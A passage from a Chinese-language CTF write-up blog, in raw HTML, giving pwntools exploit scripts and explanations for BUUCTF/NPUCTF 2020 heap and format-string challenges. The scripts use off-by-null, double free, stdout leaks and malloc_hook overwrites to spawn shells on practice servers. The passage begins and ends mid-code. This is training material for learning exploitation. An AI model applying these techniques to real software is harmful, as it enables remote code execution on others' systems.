keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token operator">-</span>i<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 0</span>    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x540</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 0</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 1</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ebca0</span>free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>__malloc_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4f322</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>泄露地址的思路为：构造三个chunk，编号为0，1，2，通过chunk1off-by-onechunk2，将chunk2的prevsize设置为chunk0+chunk1，并将其标志位清零，这样dele2就会将chunk012一起dele，dele chunk2之前我们需要先将chunk0dele，然后我们将chunk0申请回来，main_arena的地址就落到了chunk1上，而chunk1仍在使用状态，所以我们只需要show(1)就能泄露出libc地址，这里需要注意的是，dele函数在free掉相应的chunk后，会将数据段全部置为0xda，所以我们需要将chunk2的prevsize位(也就是chunk1的最后八字节)每次一字节清零，然后再进行offbynull。</p><p>有了地址之后我们就能算出其他函数在内存中的地址，然后我们再申请一个chunk1大小的chunk，即为chunk2(原本的chunk2已经被free)，这样chunk1和chunk2指向的是同一块地址，我们dele(1),dele(2)，就能造成doublefree，然后劫持malloc_hook即可getshell</p><h2 id="0xb-npuctf-2020-level2"><a href="#0xb-npuctf-2020-level2" class="headerlink" title="0xb.npuctf_2020_level2"></a>0xb.npuctf_2020_level2</h2><p>Ubuntu18的环境，一道格式化字符串在bss段上的题，除了canary其他保护全部开启.我最不擅长的类型就是格式化字符串，这种在bss段上的题目从来没做过，平常做的也都是一些简单的复写got表的题目，这道题目困扰了我很久，比赛最后一天才出来，先把exp贴上</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process("./level2")</span><span class="token comment" spellcheck="true">#io=remote('ha1cyon-ctf.fun',30258)</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28126</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'level2'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27_x64.so'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%6$p%7$p%9$p"</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>pro_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x830</span>libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">231</span>stack <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">232</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'pro_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pro_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4f322</span>offset0 <span class="token operator">=</span> stack <span class="token operator">&amp;</span> <span class="token number">0xffff</span>offset1 <span class="token operator">=</span> onegadget <span class="token operator">&amp;</span> <span class="token number">0xffff</span>offset2 <span class="token operator">=</span> <span class="token punctuation">(</span>onegadget <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset1 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset2 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%9$hnxxxx\x00"</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset1<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%35$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%9$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset2<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%35$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"66666666\x00"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>程序可以无限次循环，直到输入66666666退出格式化字符串在bss段上的程序，无论输入多少个%p我们都得不到格式化字符串的偏移，这样的题目一般是在栈上找一条链，以此作为跳板修改rip的最后几个字节为onegadget,下面我们来看看这道题目首先我们要泄露libc地址，栈地址以及程序加载的基地址，这些在栈中都能找到相应的值加以运算就能得到</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/24.jpg" alt=""></p><p>通过这三个箭头指向的值我么能分别算出程序加载的基地址，libc基地址和栈地址，这三个值对应的偏移分别是6，7，9，偏移都是一个个试出来的程序加载地址和程序加载基地址的偏移都是固定的</p><p>我们只需要计算出偏移即可知道了三个地址之后，接着就要以栈中的某一条链作为跳板来修改rip了，这条链其实就在偏移为9的位置</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/25.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/26.jpg" alt=""></p><p>接着，我们将偏移为9的那条链中的值指向的地址改为rip，修改之后如下</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/27.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/28.jpg" alt=""></p><p>接着，我们修改r13下面那个地址的值(偏移为35)的后四位为onegadget的后四位，这样的话，rip的后四位也会相应改变修改之后如下</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/29.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/30.jpg" alt=""></p><p>不过onegadget和libc_start_main的地址的后六位不一样，所以我们要继续修改两位，于是我们再将__libc_start_main_往后挪两位，然后将onegadget移位，重复之前的过程即可</p><h2 id="0xc-npuctf-2020-bad-guy"><a href="#0xc-npuctf-2020-bad-guy" class="headerlink" title="0xc.npuctf_2020_bad_guy"></a>0xc.npuctf_2020_bad_guy</h2><p>保护全开的程序，漏洞点在edit功能中，存在存在堆溢出，没有show功能</p><p>整体思路就是通过覆盖main_arena的后四位到stdout来泄露libc地址，然后劫持malloc_hook,exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># io=process('./badguy')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'badguy'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\xdd\xf5'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x20'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> cyclic<span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x08'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c56a3</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    onegadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1147</span>    __malloc_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c4b10</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(io)</span>    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./badguy'</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#io=remote('ha1cyon-ctf.fun',30115)</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>先通过堆溢出，在堆上踩下main_arena的地址(做麻烦了，不必这样的),然后把那块chunk申请回来，并修改fd上的数据的最后四位为stdout的最后四位(main_arena的地址落在fd上了)再申请另一块chunk，free掉，通过这块被free的chunk的上一块chunk进行溢出，覆盖其fd指向之前那块fd指向stdout的chunk，这样当我们add两次，就有几率申请到stdout附近，泄露出libc地址。有了地址之后，又有堆溢出，简直是为所欲为，就不细🔒了</p><h2 id="0xc-npuctf-2020-easyheap"><a href="#0xc-npuctf-2020-easyheap" class="headerlink" title="0xc.npuctf_2020_easyheap"></a>0xc.npuctf_2020_easyheap</h2><p>很简单的一道题，2.27的环境，got表可写，存在off-by-one漏洞</p><p>先贴上exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process('./npuctf_2020_easyheap')</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29074</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'npuctf_2020_easyheap'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token 